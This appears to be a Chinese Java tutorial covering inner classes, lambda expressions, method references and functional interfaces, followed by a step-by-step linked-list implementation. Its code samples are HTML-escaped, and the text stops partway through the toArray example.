其实从整体的代码结构上来讲内部类的结构并不合理。所以内部类本身来讲最大的缺陷在于破坏了程序的结构，但是破坏需要有目的的破坏，那么它也一定会有其优势，如果想要更好地观察出内部类的优势，就可以将这个内部类拿到外面来。\n范例：将以上程序分为两个类\npackage two;//内部类的基本概念class Outer &#123;//外部类    private String msg = &quot;mes9s0&quot;;    public void fun() &#123;//普通方法        //思考五：需要将当前对象Outer传递到Inner类之中        Inner in = new Inner(this);//实例化内部类对象        in.print();    &#125;    //思考一：msg属性如果要被外部访问需要提供有getter方法    public String getMsg() &#123;        return this.msg;    &#125;&#125;class Inner &#123;//在Outer类的内部定义了Inner类    //思考三：Inner这个类对象实例化的时候需要Outer类的引用    private Outer out;    //思考四：应该通过Inner类的构造方法获取Outer类对象    public Inner(Outer out)&#123;        this.out = out;    &#125;    public void print() &#123;        //思考二：如果要想调用外部类中的getter方法,一定需要outer类对象        System.out.println(this.out.getMsg());//输出Outer类中的属性    &#125;&#125;public class Test51 &#123;    public static void main(String[] args) &#123;        Outer out = new Outer();//实例化外部类        out.fun();//调用外部类中的方法    &#125;&#125;\n\n​    可以发现，整体的目的就是为了让Inner这个内部类可以访问Outer这个类中的私有属性。如果不用内部类的时候整体代码非常的麻烦，所以可以得出内部类的优点：轻松的访问外部类的私有属性。\n内部类的相关说明​    现在已经清楚的认识到了内部类的优势以及结构，那么随后需要对内部类进行一些相关的说明，现在所定义的内部类都属于普通的内部类的形式，普通的类内部往往会提供有属性和方法，内部类虽然可以轻松的访问外部类的私有成员和私有方法，同理，外部类也可以轻松的访问内部类中的私有成员或私有方法。\n范例：外部类访问内部类中的私有属性\npackage two;//外部类访问内部类中的私有属性class Outer1 &#123;//外部类    private String msg = &quot;mes9s0&quot;;    public void fun() &#123;//普通方法        Inner in = new Inner();//实例化内部类对象        in.print();        System.out.println(in.info);    &#125;    class Inner&#123;//在Outer类的内部定义了Inner类        private String info = &quot;今天天气不好收衣服！&quot;;        public void print()&#123;            System.out.println(Outer1.this.msg);//输出Outer类中的属性        &#125;    &#125;&#125;public class Test52 &#123;    public static void main(String[] args) &#123;        Outer1 out = new Outer1();//实例化外部类        out.fun();//调用外部类中的方法    &#125;&#125;\n\n\n​    使用了内部类之后，内部类和外部类之间的私有操作的访问就不再需要通过setter、getter的方式间接完成了，可以通过内部类直接进行处理操作。\n​    但是需要注意的是，内部类本身也属于一个类，虽然在大部分的情况下内部类往往是被外部类包裹的，但是外部依然可以产生内部类的实例化对象，而此时内部类实例化对象的格式如下：\n外部类.内部类 内部类对象 = new 外部类().new 内部类();\n\n​    在内部类编译完成后会自动形成一个“Outer$Inner.class”类文件，其中“$”这个符号换到程序之中就变为了“.”所以内部类的全称就是“外部类.内部类”。内部类与外部类之间可以直接进行私有成员的访问，这样一来内部类如果要是提供有实例化对象，一定要保证外部类要先实例化。\npackage two;//外部类访问内部类中的私有属性class Outer1 &#123;//外部类    private String msg = &quot;mes9s0&quot;;    class Inner&#123;//在Outer类的内部定义了Inner类        private String info = &quot;今天天气不好收衣服！&quot;;        public void print()&#123;            System.out.println(Outer1.this.msg);//输出Outer类中的属性        &#125;    &#125;&#125;public class Test52 &#123;    public static void main(String[] args) &#123;        Outer1.Inner in = new Outer1().new Inner();//实例化外部类        in.print();    &#125;&#125;\n\n​    如果此时Inner类只允许Outer类来使用，那么在这样的情况下就可以使用private进行私有定义。\npackage two;//外部类访问内部类中的私有属性class Outer1 &#123;//外部类    private String msg = &quot;mes9s0&quot;;    private class Inner&#123;//在Outer类的内部定义了Inner类        private String info = &quot;今天天气不好收衣服！&quot;;        public void print()&#123;            System.out.println(Outer1.this.msg);//输出Outer类中的属性        &#125;    &#125;&#125;public class Test52 &#123;    public static void main(String[] args) &#123;        Outer1.Inner in = new Outer1().new Inner();//实例化外部类        in.print();    &#125;&#125;\n\n\n​    此时的Inner类无法在外部进行使用。\n​    在Java中类作为最基础的结构体实际上还有与之类似的抽象类或者是接口，抽象类与接口中都可以定义内部结构。\n范例：定义内部接口\npackage two;//定义内部接口//定义接口interface IChannel2 &#123;    public void send(IMessage5 msg);//发送消息    interface IMessage5 &#123;//内部接口        public String getContent();//获取消息内容    &#125;&#125;class ChannelImpl implements IChannel2 &#123;    @Override    public void send(IMessage5 msg) &#123;        System.out.println(&quot;发送消息：&quot;+msg.getContent());    &#125;    class MessageImpl implements IMessage5&#123;        @Override        public String getContent() &#123;            return &quot;mes9s0&quot;;        &#125;    &#125;&#125;public class Test53 &#123;    public static void main(String[] args) &#123;        IChannel2 channel = new ChannelImpl();        channel.send(((ChannelImpl)channel).new MessageImpl());    &#125;&#125;\n\n​    下面继续观察一个内部的抽象类，内部抽象类可以定义在普通类、抽象类、接口内部。\n范例：观察内部抽象类\npackage two;//观察内部抽象类//定义接口interface IChannel3 &#123;    public void send();//发送消息    abstract class AbstractMessage &#123;        public abstract String getContent();    &#125;&#125;class ChannelImpl1 implements IChannel3 &#123;    @Override    public void send() &#123;        AbstractMessage msg1 = new MessageImpl1();        System.out.println(msg1.getContent());    &#125;    class MessageImpl1 extends AbstractMessage&#123;        @Override        public String getContent() &#123;            return &quot;mes9s0&quot;;        &#125;    &#125;&#125;public class Test54 &#123;    public static void main(String[] args) &#123;        IChannel3 channel = new ChannelImpl1();        channel.send();    &#125;&#125;\n\n​    内部类还有一些有意思的结构，即：如果现在定义了一个接口，那么可以在内部利用类实现该接口。在JDK1.8后，接口中追加了static方法可以不受到实例化对象的控制，现在就可以利用此特性来完成功能。\n范例：接口内部进行接口实现\npackage two;//接口内部进行接口实现//定义接口interface IChannel4 &#123;    public void send();//发送消息    class ChannelImpl implements IChannel4&#123;        @Override        public void send() &#123;            System.out.println(&quot;mes9s0&quot;);        &#125;    &#125;    public static IChannel4 getInstance()&#123;        return new ChannelImpl();    &#125;&#125;public class Test55 &#123;    public static void main(String[] args) &#123;        IChannel4 channel = IChannel4.getInstance();        channel.send();//mes9s0    &#125;&#125;\n\n​    内部类是非常灵活的定义结构，只要语法满足了，各种需求都可以帮你实现。\nstatic定义内部类​    如果说在内部类上使用了static定义，那么这个内部类就变为了“外部类”，static定义的都是独立于类的结构，所以该类的结构就相当于一个独立的程序类了。需要注意的是，static定义的不管是类还是方法只能够访问static成员，所以static定义的内部类只能够访问外部类中的static属性或方法。\n范例：使用static内部类\nclass Outer2 &#123;    private static final String MSG = &quot;mes9s0&quot;;    static class Inner &#123;        public void print() &#123;            System.out.println(Outer2.MSG);        &#125;    &#125;&#125;\n\n​    这个时候的Inner类是一个独立的类，如果此时想要实例化Inner类对象，只需要根据“外部类.内部类”的结构实例化对象即可。格式如下：\n​    以前的模式：\n外部类.内部类 内部类对象 = new 外部类().new 内部类();\n\n​    现在的模式：\n外部类.内部类 内部类对象 = new 外部类.内部类();\n\n​    这个时候的类名称带有“.”\n范例：实例化static内部类对象\npackage two;//static内部类class Outer2 &#123;    private static final String MSG = &quot;mes9s0&quot;;    static class Inner &#123;        public void print() &#123;            System.out.println(Outer2.MSG);        &#125;    &#125;&#125;public class Test56 &#123;    public static void main(String[] args) &#123;        Outer2.Inner in = new Outer2.Inner();        in.print();//mes9s0    &#125;&#125;\n\n​    以后在开发中如果看到类名称上带有“.”首先应该立刻想到这是一个内部类的结构，如果可以直接进行实例化，则应该立刻认识到这是一个static定义的内部类。\n​    如果以static定义内部类的形式并不常用，static定义内部接口的形式最为常用。\n范例：static定义内部接口\npackage two;//static定义内部接口class IMessageWarp &#123;     //消息包装    static interface IMessage &#123;        public String getContent();//消息内容    &#125;    static interface IChannel &#123;        public boolean connect();//消息发送通道    &#125;    public static void send(IMessage msg, IChannel channel) &#123;        if (channel.connect()) &#123;            System.out.println(msg.getContent());        &#125; else &#123;            System.out.println(&quot;消息通道无法建立，发送失败&quot;);        &#125;    &#125;&#125;class DefaultMessage implements IMessageWarp.IMessage &#123;    @Override    public String getContent() &#123;        return &quot;mes9s0&quot;;    &#125;&#125;class NetChannel implements IMessageWarp.IChannel&#123;    @Override    public boolean connect() &#123;        return true;    &#125;&#125;public class Test57 &#123;    public static void main(String[] args) &#123;        IMessageWarp.send(new DefaultMessage(),new NetChannel());    &#125;&#125;\n\n​    之所以使用static定义内部接口，主要是因为这些操作是属于一组相关的定义，有了外部接口之后可以更加明确的描述出这些接口的主要功能。\n方法中定义内部类​    内部类可以在任意的结构中进行定义，这就包括了：类中、方法中、代码块中。但是从实际的开发中来讲，在方法中定义的形式较多。\n范例：在方法中定义的内部类\npackage two;//在方法中定义内部类class Outer3 &#123;    private String msg = &quot;mes9s0&quot;;    public void fun(long time) &#123;        //内部类        class Inner &#123;            public void print()&#123;                System.out.println(Outer3.this.msg);                System.out.println(time);            &#125;        &#125;        new Inner().print(); //方法中实例化内部类对象    &#125;&#125;public class Test58 &#123;    public static void main(String[] args) &#123;        new Outer3().fun(235343636);\t//mes9s0；235343636    &#125;&#125;\n\n​    此时在fun()方法内部提供有叫做Inner内部类的定义，并且发现内部类可以直接访问外部类中的私有属性也可以直接访问方法中的参数，但是对于方法中的参数直接访问是从JDK1.8开始的，而在JDK1.8之前，如果要想访问方法中的参数则参数前必须追加final。\n匿名内部类​    匿名内部类是一种简化的内部类的处理形式，其主要是在抽象类和接口的子类上使用的。\n范例：观察一个基础的程序结构\npackage two;//匿名内部类interface IMessage5&#123;    public void send(String str);&#125;class MessageImpl1 implements IMessage5&#123;    @Override    public void send(String str) &#123;        System.out.println(str);    &#125;&#125;public class Test59 &#123;    public static void main(String[] args) &#123;        IMessage5 msg = new MessageImpl1();        msg.send(&quot;mes9s0&quot;);    &#125;&#125;\n\n​    若果说现在IMessage接口中的MessageImpl子类只使用唯一的一次，那么是否有必要将其定义为一个单独的类。那么这个时候我们会发现，定义的子类是有些多余的，所以就可以利用匿名内部类的形式来解决此问题。\npackage two;//匿名内部类interface IMessage5&#123;    public void send(String str);&#125;public class Test59 &#123;    public static void main(String[] args) &#123;        IMessage5 msg = new IMessage5() &#123;            @Override            public void send(String str) &#123;                System.out.println(str);            &#125;        &#125;;        msg.send(&quot;mes9s0&quot;);//mes9s0    &#125;&#125;\n\n​    有些时候为了更加方便的体现出匿名内部类的使用，往往可以利用静态方法做一个内部的匿名内部类的实现。\n范例：在接口中直接定义匿名内部类\npackage two;//匿名内部类interface IMessage5&#123;    public void send(String str);    public static IMessage5 getInstance()&#123;        return new IMessage5() &#123;            @Override            public void send(String str) &#123;                System.out.println(str);            &#125;        &#125;;    &#125;&#125;public class Test59 &#123;    public static void main(String[] args) &#123;        IMessage5.getInstance().send(&quot;mes9s0&quot;);    &#125;&#125;\n\n​    与内部类相比，匿名内部类只是一个没有名字的只能够使用一次的，并且结构固定的一个子类操作。\n\n函数式编程Lamda表达式​    从JDK1.8开始为了简化使用者进行代码的开发，专门提供有Lambda表达式的支持，利用此操作形式可以实现函数式的编程。以前函数式编程比较著名的语言：haskell、Scala，利用函数式编程可以处理掉面向对象编程中的一些繁琐的问题。\n​    面向对象在发展的过程中一直有一部分反对者，这些反对者认为面向对象的设计过于复杂，并且过于繁琐，以一个最简单的程序为例：\ninterface IMessage5&#123;    public void send(String str);&#125;public class Test59 &#123;    public static void main(String[] args) &#123;        IMessage5 msg = new IMessage5() &#123;            @Override            public void send(String str) &#123;                System.out.println(str);            &#125;        &#125;;        msg.send(&quot;mes9s0&quot;);//mes9s0    &#125;&#125;\n\n​    在这样一个程序里，实际上核心功能就一行语句：“System.out.print(str)”，但是为了这一行的核心语句，我们依然需要按照完整的面向对象给出的设计结构进行开发。于是这些问题随着技术的发展也越来越突出。\n范例：使用Lambda表达式实现一摸一样的功能\npackage two;//Lambda表达式interface IMessage6&#123;    public void send(String str);&#125;public class Test60 &#123;    public static void main(String[] args) &#123;        IMessage6 msg = (str) -&gt; &#123;            System.out.println(&quot;发送消息：&quot;+str);        &#125;;        msg.send(&quot;mes9s0&quot;);    &#125;&#125;\n\n​    现在整个程序代码里面会发现真的只是编写了一行语句，于是利用这种形式就避免了复杂的面向对象结构化的要求。\n​    Lambda表达式如果想要使用，那么必须有一个重要的要求：SAM（Single Abstract Method），只有一个抽象方法，以之前的IMessage接口为例，在这个接口里面发现只是提供有一个send()方法，除此之外没有任何的方法定义，这样的接口就可以被称为函数式接口，而只有函数式接口才可以被Lambda表达式所使用。\n范例：使用函数式接口注解\npackage two;//Lambda表达式@FunctionalInterface //函数式接口interface IMessage6&#123;    public void send(String str);&#125;public class Test60 &#123;    public static void main(String[] args) &#123;        IMessage6 msg = (str) -&gt; &#123;            System.out.println(&quot;发送消息：&quot;+str);        &#125;;        msg.send(&quot;mes9s0&quot;);    &#125;&#125;\n\n​    而这也就是我们接口中增加普通方式时必须写default的原因，如果不写default，则会被识别成abstract，而我们的函数式编程就会出现问题。\n​    对于Lambda表达式而言，提供有如下几种格式：\n​    1、方法没有参数：()-&gt;{};\n​    2、方法有参数：(参数,参数)-&gt;{};\n​    3、如果现在只有一行语句返回:(参数,参数)-&gt;语句;\n范例：定义没有参数的方法\npackage two;//Lambda表达式@FunctionalInterface //函数式接口interface IMessage6&#123;    public void send();&#125;public class Test60 &#123;    public static void main(String[] args) &#123;        IMessage6 msg = () -&gt; &#123;            System.out.println(&quot;发送消息：mes9s0&quot;);        &#125;;        msg.send();    &#125;&#125;\n\n范例：定义有参数的处理形式\npackage two;//Lambda表达式@FunctionalInterface //函数式接口interface IMath&#123;    public int add(int x,int y);&#125;public class Test60 &#123;    public static void main(String[] args) &#123;        IMath math = (t1,t2) -&gt; &#123;            return t1 + t2;        &#125;;        System.out.println(math.add(10,20));    &#125;&#125;\n\n​    以上的表达式之中只有一行一句，可以进一步简化。\npackage two;//Lambda表达式@FunctionalInterface //函数式接口interface IMath&#123;    public int add(int x,int y);&#125;public class Test60 &#123;    public static void main(String[] args) &#123;        IMath math = (t1,t2) -&gt; t1+t2;        System.out.println(math.add(10,20));    &#125;&#125;\n\n​    使用lambda表达式可以解决传统面向对象之中关于结构的限制，使得代码更加的简便。\n方法引用​    引用数据类型最大的特点就是可以进行内存的指向处理，但是在传统的开发之中使用的一直只是对象引用操作。而在JDK1.8之后我们也提供方法的引用，即：不同的方法名称可以描述同一个方法。如果要进行方法的引用在Java里面提供有如下四种形式：\n​    1、引用静态方法——-类名称 :: static方法名称\n​    2、引用某个实例对象的方法——实例化对象 :: 普通方法\n​    3、引用特定类型的方法——特定类 :: 普通方法\n​    4、引用构造方法——类名称 :: new\n范例：引用静态方法\n​    在String类里面提供有String.valueOf()方法，这个方法就属于静态方法\n\n方法定义：public static String valueOf(int i);该方法有参数还有返回值。\n\npackage two;//lambda表达式方法引用//p参数，r是rutern@FunctionalInterfaceinterface IFunction&lt;P,R&gt;&#123;    public R change(P p);&#125;public class Test61 &#123;    public static void main(String[] args) &#123;        IFunction&lt;Integer,String&gt; fun = String :: valueOf;        String str = fun.change(100);        System.out.println(str.length());//3    &#125;&#125;\n\n​    利用方法引用这一概念可以为一个方法定义多个名字，但是要求必须是函数式接口。\n范例：引用实例化对象中的方法\n​    在String类里面有一个转大写的方法：public String toUpperCase();\n\n这个方法是必须在有实例化对象提供的情况下才可以调用。\n\npackage two;//lambda表达式方法引用//p参数，r是rutern@FunctionalInterfaceinterface IFunction&lt;R&gt;&#123;    public R upper();&#125;public class Test61 &#123;    public static void main(String[] args) &#123;        IFunction&lt;String&gt; fun = &quot;mes9s0&quot; :: toUpperCase;        System.out.println(fun.upper());//MES9S0    &#125;&#125;\n\n​    在进行方法引用的时候也可以引用特定类中的一些操作方法。\n​    在String类里面提供有一个字符串大小关系的比较:public int compareTo(String anotherString);\n\n这是一个普通方法，如果要引用普通方法，则往往都需要实例化对象，但是如果说现在不想给出实例化对象，只是想引用这个方法，则可以使用特定类类进行引用处理。\n\n范例：引用指定类中的方法\npackage two;//lambda表达式方法引用//p参数，r是rutern@FunctionalInterfaceinterface IFunction&lt;P&gt; &#123;    public int compare(P p1, P p2);&#125;public class Test61 &#123;    public static void main(String[] args) &#123;        IFunction&lt;String&gt; fun = String::compareTo;        System.out.println(fun.compare(&quot;A&quot;, &quot;a&quot;));//-32    &#125;&#125;\n\n​    在方法引用里面最具有杀伤力的就是构造方法的引用。\n范例：引用构造方法\npackage two;//lambda表达式方法引用class Person12 &#123;    private String name;    private int age;    public Person12(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;    public String toString() &#123;        return &quot;姓名：&quot; + this.name + &quot;、年龄：&quot; + this.age;    &#125;&#125;@FunctionalInterfaceinterface IFunction&lt;R&gt; &#123;    public R create(String s, int a);&#125;public class Test61 &#123;    public static void main(String[] args) &#123;        IFunction&lt;Person12&gt; fun = Person12::new;        System.out.println(fun.create(&quot;张三&quot;, 20));    &#125;&#125;\n\n​    提供方法引用的概念更多的情况下也只是弥补了对于引用的支持功能。\n内建函数式接口​    在JDK1.8之中提供有lambda表达式也提供有方法引用，但是你会发现现在如果由开发者自己定义函数式接口，往往都需要使用“@FunctionalIntetrface”注解来进行大量声明，于是很多的情况下如果为了方便则可以直接引用系统中提供的函数式接口。\n​    在系统中专门提供了java.util.function的开发包，里面可以直接使用函数式接口，在这个包下面一共有如下的几个核心接口供使用。\n1、功能性函数式接口：\n​    对于接受和返回一个值的可以使用。\n​    例如在String类中有一个方法判断是否以制定的字符串开头:public boolean startsWith(String str)\n\n\n\n接口定义：\n接口使用：\n\n\n\n\n\n\n\n2、消费型函数式接口：\n​    对于只能够进行数据的处理操作，而没有任何的返回。\n​    例如在进行系统数据输出的时候使用的是：System.out.println();\n\n\n\n接口定义：\n接口使用：\n\n\n\n\n\n\n\n3、供给型函数式接口：\n​    对于只能够进行数据返回，而没有接受参数。\n​    在String类中提供有转小写方法 public String toLowerCase()，这个方法没有接受参数，但是有返回值;\n\n\n\n接口定义：\n接口使用：\n\n\n\n\n\n\n\n4、断言型函数式接口\n​    进行判断处理。\n​    在String类有一个equalsIgnoreCase()方法\n\n\n\n接口定义：\n接口使用：\n\n\n\n\n\n\n\n​    以后对于实际的项目，如果JDK本身提供的函数式接口可以被我们所使用，那么就没有必要进行重新定义了。\n\n链表的定义与使用​    链表的本质是一个动态的对象数组，它可以实现若干个对象的存储。\n链表实现简介​    在实际的开发之中对象数组是一项非常实用的技术，并且利用其可以描述出“多”方的概念，例如：一个人有多本书，则在人的类里面一定要提供有一个对象数组保存书的信息，但是传统的对象数组依赖于数组的概念，所以数组里面最大的缺点在于长度是固定的，正是因为如此所以在实际的开发之中，传统的数组应用是非常有限的（数组的接收以及循环处理）。但是如果要想进行灵活的数据保存，俺么久必须自己来实现结构。\n\n​    传统的对象数组的开发操作依赖于索引的控制，如果想要实现内容的动态维护，那么难度太高了，而且复杂度攀升。所以现在就可以发现，对于一成不动的数据可以使用对象数组来实现，但是对于可能随时变化的数据就必须实现一个可以动态扩充的对象数组。\n​    所谓的链表实质性的本质是利用引用的逻辑关系来实现类似于数组的数据处理操作，以一种保存“多”方数据的形式，实现数组类似的功能。\n\n​    通过分析可以发现，如果想要实现链表处理，那么需要有一个公共的结构，这个结构可以实现数据的保存以及下一个连接的指向。为了描述这样的逻辑，可以把每一个存储理解为一个节点，所以此时应该出一个节点类，这个节点类里面可以保存各种数据类型的数据。\n\n​    虽然已经清楚了通过Node节点来进行数据的保存，但是毕竟这里面需要牵扯到节点的引用处理关系。那么这个引用处理关系肯定不可能由使用者来配置，所以还需要一个类来进行Node类的配置。\n范例：直接操作Node\npackage two;//链表实现class Node&lt;E&gt; &#123;    private E data;    private Node next;    public Node(E data) &#123;        this.data = data;    &#125;    public E getData() &#123;        return this.data;    &#125;    public void setNext(Node&lt;E&gt; next) &#123;        this.next = next;    &#125;    public Node getNext() &#123;        return this.next;    &#125;&#125;public class Test63 &#123;    public static void main(String[] args) &#123;        Node&lt;String&gt; n1 = new Node&lt;&gt;(&quot;火车头&quot;);        Node&lt;String&gt; n2 = new Node&lt;&gt;(&quot;车厢1&quot;);        Node&lt;String&gt; n3 = new Node&lt;&gt;(&quot;车厢2&quot;);        Node&lt;String&gt; n4 = new Node&lt;&gt;(&quot;车厢3&quot;);        Node&lt;String&gt; n5 = new Node&lt;&gt;(&quot;车厢4&quot;);        n1.setNext(n2);        n2.setNext(n3);        n3.setNext(n4);        n4.setNext(n5);        print1(n1);    &#125;    public static void print1(Node&lt;?&gt; node) &#123;        if (node != null) &#123;            System.out.println(node.getData());            print1(node.getNext());        &#125;    &#125;&#125;\n\n​    这样肯定不可能的，所以应该有一个专门的类来进行节点的引用关系的配置。因为真实的使用者实际上关心的只是数据的存储与获取，所以现在应该对Node类进行包装处理。\n\n数据增加​    数据保存：public void add(E e)\n​    通过之前的分析可以发现在进行链表操作的过程之中为了避免转型的异常应该使用的是泛型，同时也应该设计一个链表的标准接口，同时具体实现该接口的时候还应该通过Node类做出节点的关系描述。\n范例：定义Node类\nclass LinkImpl&lt;E&gt; implements ILink&lt;E&gt; &#123;    //保存节点的数据关系    private class Node&#123;        private E data; //保存的数据        private Node next; //保存下一个引用        //限制node必须有数据，有数据才有意义        public Node(E data)&#123;            this.data = data;        &#125;    &#125;    // -----------以下为Link类中定义的结构----------&#125;\n\n​    现在定义的Node类之中并没有出现setter与getter方法，是因为内部类中的私有属性也方便外部类服务。\n范例：实现数据增加\npackage two;//链表数据增加interface ILink&lt;E&gt; &#123; //设置泛型避免安全隐患    public void add1(E e);&#125;class LinkImpl&lt;E&gt; implements ILink&lt;E&gt; &#123;    //保存节点的数据关系    private class Node &#123;        private E data; //保存的数据        private Node next; //保存下一个引用        //限制node必须有数据，有数据才有意义        public Node(E data) &#123;            this.data = data;        &#125;        //第一次调用：this = LinkImpl.root;        //第二次调用：this = LinkImpl.root.next;        //第三次调用: this = LinkImpl.root.next.next;        public void addNode(Node newNode)&#123; //保存新的node数据            if (this.next == null)&#123;                this.next = newNode;            &#125;else &#123;                this.next.addNode(newNode);            &#125;        &#125;    &#125;    // -----------以下为Link类中定义的成员----------    private Node root; //保存根元素    // -----------以下为Link类中定义的方法----------    @Override    public void add1(E e) &#123;        if (e == null) &#123;            return;        &#125;        //数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中        Node newNode = new Node(e);//创建一个新节点        if (this.root == null)&#123; //现在没有根节点            this.root = newNode; //现在第一个节点作为根节点        &#125;else &#123;            this.root.addNode(newNode);//将新节点保存在合适的位置        &#125;    &#125;&#125;public class Test64 &#123;    public static void main(String[] args) &#123;        ILink&lt;String&gt; all = new LinkImpl&lt;&gt;();        all.add1(&quot;hello&quot;);        all.add1(&quot;world&quot;);        all.add1(&quot;mes9s0&quot;);    &#125;&#125;\n\n​    Link类只是负责数据的操作与根节点的处理，而后续节点内部的处理全部是由Node类负责完成的。\n获取集合个数​    获取数据长度：public int size()\n​    在链表之中往往需要保存大量的数据，这些数据往往需要进行数据个数的统计操作，所以应该在LinkImpl子类里面追加有数据统计信息，同时当增加或删除数据时都应该对个数进行修改。\n​    1、在ILink接口里面追加有一个获取数据个数的方法：\ninterface ILink&lt;E&gt; &#123; //设置泛型避免安全隐患    public void add1(E e);//增加节点    public int size1();//获取数据个数&#125;\n\n​    2、在LinkImpl子类里面追加一个个数统计的属性\nprivate int count;//保存数据个数\n\n​    3、在add()方法里进行数据个数的追加\npublic void add1(E e) &#123;    if (e == null) &#123;        return;    &#125;    //数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中    Node newNode = new Node(e);//创建一个新节点    if (this.root == null)&#123; //现在没有根节点        this.root = newNode; //现在第一个节点作为根节点    &#125;else &#123;        this.root.addNode(newNode);//将新节点保存在合适的位置    &#125;    this.count++;&#125;\n\n​    4、在LinkImpl子类立面来返回数据的个数\n@Overridepublic int size1() &#123;    return this.count;&#125;\n\n范例：数据统计\npackage two;//链表数据增加interface ILink&lt;E&gt; &#123; //设置泛型避免安全隐患    public void add1(E e);//增加节点    public int size1();//获取数据个数&#125;class LinkImpl&lt;E&gt; implements ILink&lt;E&gt; &#123;    //保存节点的数据关系    private class Node &#123;        private E data; //保存的数据        private Node next; //保存下一个引用        //限制node必须有数据，有数据才有意义        public Node(E data) &#123;            this.data = data;        &#125;        //第一次调用：this = LinkImpl.root;        //第二次调用：this = LinkImpl.root.next;        //第三次调用: this = LinkImpl.root.next.next;        public void addNode(Node newNode) &#123; //保存新的node数据            if (this.next == null) &#123;                this.next = newNode;            &#125; else &#123;                this.next.addNode(newNode);            &#125;        &#125;    &#125;    // -----------以下为Link类中定义的成员----------    private Node root; //保存根元素    private int count;//保存数据个数    // -----------以下为Link类中定义的方法----------    @Override    public void add1(E e) &#123;        if (e == null) &#123;            return;        &#125;        //数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中        Node newNode = new Node(e);//创建一个新节点        if (this.root == null) &#123; //现在没有根节点            this.root = newNode; //现在第一个节点作为根节点        &#125; else &#123;            this.root.addNode(newNode);//将新节点保存在合适的位置        &#125;        this.count++;    &#125;    @Override    public int size1() &#123;        return this.count;    &#125;&#125;public class Test64 &#123;    public static void main(String[] args) &#123;        ILink&lt;String&gt; all = new LinkImpl&lt;&gt;();        System.out.println(&quot;增加之前数据个数：&quot; + all.size1());        all.add1(&quot;hello&quot;);        all.add1(&quot;world&quot;);        all.add1(&quot;mes9s0&quot;);        System.out.println(&quot;增加之后数据个数：&quot; + all.size1());    &#125;&#125;\n\n​    只是对于数据保存中的一个辅助功能。\n空集合判断​    空集合判断：public boolean isEmpty()\n​    链表里面可以保存有若干个数据，如果说现在链表还没有保存数据，则就表示是一个空集合，则应该提供有一个空的判断。\n​    1、在ILink接口里面追加有判断方法：\npublic boolean isEmpty();//判断空集合\n\n​    2、在LinkImpl子类里面覆写此方法：\npublic boolean isEmpty() &#123;    //return this.root == null;    return this.count == 0;&#125;\n\n​    使用根元素喝count==0是一样的\n范例：\npackage two;//链表数据增加interface ILink&lt;E&gt; &#123; //设置泛型避免安全隐患    public void add1(E e);//增加节点    public int size1();//获取数据个数    public boolean isEmpty();//判断空集合&#125;class LinkImpl&lt;E&gt; implements ILink&lt;E&gt; &#123;    //保存节点的数据关系    private class Node &#123;        private E data; //保存的数据        private Node next; //保存下一个引用        //限制node必须有数据，有数据才有意义        public Node(E data) &#123;            this.data = data;        &#125;        //第一次调用：this = LinkImpl.root;        //第二次调用：this = LinkImpl.root.next;        //第三次调用: this = LinkImpl.root.next.next;        public void addNode(Node newNode) &#123; //保存新的node数据            if (this.next == null) &#123;                this.next = newNode;            &#125; else &#123;                this.next.addNode(newNode);            &#125;        &#125;    &#125;    // -----------以下为Link类中定义的成员----------    private Node root; //保存根元素    private int count;//保存数据个数    // -----------以下为Link类中定义的方法----------    @Override    public void add1(E e) &#123;        if (e == null) &#123;            return;        &#125;        //数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中        Node newNode = new Node(e);//创建一个新节点        if (this.root == null) &#123; //现在没有根节点            this.root = newNode; //现在第一个节点作为根节点        &#125; else &#123;            this.root.addNode(newNode);//将新节点保存在合适的位置        &#125;        this.count++;    &#125;    @Override    public int size1() &#123;        return this.count;    &#125;    @Override    public boolean isEmpty() &#123;        //return this.root == null;        return this.count == 0;    &#125;&#125;public class Test64 &#123;    public static void main(String[] args) &#123;        ILink&lt;String&gt; all = new LinkImpl&lt;&gt;();        System.out.println(&quot;增加之前数据个数：&quot; + all.size1() + &quot;、是否为空集合：&quot; + all.isEmpty());        all.add1(&quot;hello&quot;);        all.add1(&quot;world&quot;);        all.add1(&quot;mes9s0&quot;);        System.out.println(&quot;增加之后数据个数：&quot; + all.size1() + &quot;、是否为空集合：&quot; + all.isEmpty());    &#125;&#125;\n\n返回集合数据​    返回集合数据：public Object[] toArray()\n​    链表本身就属于一个动态对象数组，那么既然是一个对象数组，就应该可以把所有的数据以数组的形式返回来，那么这个时候就可以定义一个toArray()的方法，但是这个时候的方法只能够返回Object型的数组。\n\n​    1、在ILink接口里面追加新的处理方法\npublic Object[] toArray();//将集合元素以数组形式返回\n\n​    2、在LinkImpl子类里面追加有两个属性\nprivate int foot;//描述的是操作数组的脚标private Object[] returnData;//返回的数据保存\n\n​    3、在Node类中，根据递归获取数据\npublic void toArrayNode() &#123;    LinkImpl.this.returnData[LinkImpl.this.foot++] = this.data;    if (this.next != null)&#123;//还有下一个数据        this.next.toArrayNode();    &#125;&#125;\n\n​    4、在进行数据返回的时候，一定要先判断是不是null集合\npublic Object[] toArray() &#123;    if (this.isEmpty()) &#123;        return null;//无数据    &#125;    this.foot = 0;//脚标清0    this.returnData = new Object[this.count];//根据已有的长度开辟数组    this.root.toArrayNode();//利用Node类进行递归数据获取    return this.returnData;&#125;\n\n范例：\npackage two;//链表数据增加interface ILink&lt;E&gt; &#123; //设置泛型避免安全隐患    public void add1(E e);//增加节点    public int size1();//获取数据个数    public boolean isEmpty();//判断空集合    public Object[] toArray();//将集合元素以数组形式返回&#125;class LinkImpl&lt;E&gt; implements ILink&lt;E&gt; &#123;    //保存节点的数据关系    private class Node &#123;        private E data; //保存的数据        private Node next; //保存下一个引用        //限制node必须有数据，有数据才有意义        public Node(E data) &#123;            this.data = data;        &#125;        //第一次调用：this = LinkImpl.root;        //第二次调用：this = LinkImpl.root.next;        //第三次调用: this = LinkImpl.root.next.next;        public void addNode(Node newNode) &#123; //保存新的node数据            if (this.next == null) &#123;                this.next = newNode;            &#125; else &#123;                this.next.addNode(newNode);            &#125;        &#125;        //第一次调用:this = LinkImpl.root        //第二次调用:this = LinkImpl.root.next        //第三次调用: this = LinkImpl.root.next.next;        public void toArrayNode() &#123;            LinkImpl.this.returnData[LinkImpl.this.foot++] = this.data;            if (this.next != null)&#123;//还有下一个数据                this.next.toArrayNode();            &#125;        &#125;    &#125;    // 